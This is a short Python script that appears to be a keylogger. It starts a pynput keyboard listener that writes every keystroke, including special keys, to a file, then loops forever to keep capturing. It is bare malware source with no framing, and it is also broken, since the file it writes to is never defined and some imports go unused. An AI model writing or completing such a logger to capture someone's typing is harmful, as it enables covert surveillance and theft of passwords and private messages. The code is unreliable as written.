import keyboard
import time
import os

try:
    from pynput import keyboard as pynput_keyboard
except Exception as e:
    print(e)

def on_press(key):
    try:
        if isinstance(key, pynput_keyboard.Key):
            file.write(str(key))
        else:
            file.write(str(key.char))
    except Exception as e:
        print(e)

pynput_keyboard.Listener(on_press=on_press).start()

while True:
    time.sleep(0.1)